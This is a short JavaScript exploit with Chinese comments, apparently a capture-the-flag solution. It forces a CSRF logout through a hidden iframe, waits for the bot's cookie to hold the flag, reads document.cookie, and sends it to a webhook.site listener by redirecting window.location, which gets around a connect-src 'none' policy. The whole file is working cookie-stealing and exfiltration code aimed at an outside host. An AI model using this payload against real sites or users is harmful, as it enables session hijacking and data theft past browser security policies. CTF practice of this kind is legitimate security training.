// exp.js
(async function() {
    // 1. 建立一個隱藏的 iframe 來執行 CSRF 登出
    let iframe = document.createElement('iframe');
    iframe.src = '/logout'; // 請根據題目實際的登出路徑修改 (例如 /logout)
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    // 2. 稍等 1.5 秒，確保 Bot 已經登出且後端已將 Flag 寫入 Cookie
    await new Promise(resolve => setTimeout(resolve, 1500));

    // 3. 讀取當前包含 Flag 的 Cookie
    let stolenCookie = document.cookie;

    // 4. 繞過 connect-src 'none'：利用 window.location 將資料帶到你的監聽伺服器
    // 請將底下的網址替換成你的 Webhook 或 RequestBin 網址
    window.location.href = "https://webhook.site/21896e4b-7db5-4fe2-9723-b1541d0cdc08" + encodeURIComponent(stolenCookie);
})();
